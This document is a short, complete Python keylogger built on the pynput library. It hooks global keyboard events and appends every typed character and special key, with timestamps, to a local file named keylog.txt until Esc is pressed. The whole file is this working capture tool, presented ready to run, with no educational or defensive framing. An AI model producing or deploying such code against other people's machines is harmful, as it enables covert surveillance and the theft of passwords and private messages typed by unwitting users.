from pynput.keyboard import Key, Listener # ** need to pip install pynput **
from datetime import datetime

current_line = f"{datetime.now()} - "

def on_press(key):
    global current_line
    # if space is pressed, write the current line to the file
    if key == Key.space or key == Key.enter:
        with open("keylog.txt", "a") as f:
            f.write(current_line + "\n")
        current_line = f"{datetime.now()} - "
    else:
        try:
            current_line += key.char  # add the character to the current line
        except AttributeError:
            current_line += f" [{key}] "  # if the key is not a character, write it in brackets

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()